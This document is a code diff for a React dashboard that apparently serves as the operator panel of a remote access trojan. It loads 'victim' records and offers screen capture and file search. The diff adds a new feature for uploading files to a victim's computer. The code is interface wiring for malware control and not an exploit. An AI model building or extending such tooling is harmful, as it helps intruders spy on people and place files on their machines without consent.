@@ -1,12 +1,13 @@
 import React, { useEffect, useState } from "react";
 import { useLocation } from "react-router-dom";
-import { FaCamera, FaFolder, FaSearch } from "react-icons/fa";
+import { FaCamera, FaFolder, FaSearch, FaUpload } from "react-icons/fa";
 import { getVictim } from "../../service/api.service";
 import Terminal from "../../components/Terminal";
 import NotFound from "../404";
 import Header from "./sections/Header";
 import Details from "./sections/Details";
 import ScreenCapture from "./systemSections/ScreenCapture";
+import FileUploader from "./systemSections/fileUpload";
 
 const ClientDetail: React.FC = () => {
   const [tab, setTab] = useState("detail");
@@ -77,6 +78,7 @@ const ClientDetail: React.FC = () => {
           {tab === "system" && (
             <div>
               {systemTab === "screen-capture" && <ScreenCapture />}
+              {systemTab === "file-upload" && <FileUploader />}
 
               {systemTab.length === 0 && (
                 <div className="grid grid-cols-3 gap-x-6">
@@ -130,6 +132,27 @@ const ClientDetail: React.FC = () => {
                     </div>
                     <button className="py-2 px-4 bg-purple-600 hover:bg-purple-700 text-white rounded-sm mt-4">
                       Open File Search
+                    </button>
+                  </div>
+
+                  <div className="bg-white dark:bg-gray-900 rounded-lg p-4 shadow-md mt-4">
+                    <div className="flex items-center">
+                      <FaUpload className="text-3xl mr-2 text-purple-600 dark:text-purple-400" />
+                      <div>
+                        <h1 className="text-xl font-bold">File Upload:</h1>
+                        <p className="text-gray-500 dark:text-gray-400">
+                          Upload files to their computer:
+                        </p>
+                      </div>
+                    </div>
+                    <button
+                      className="py-2 px-4 bg-blue-600 hover:bg-blue-700 text-white rounded-sm mt-4"
+                      onClick={(e) => {
+                        e.preventDefault();
+                        setSystemTab("file-upload");
+                      }}
+                    >
+                      Open File Upload
                     </button>
                   </div>
                 </div>
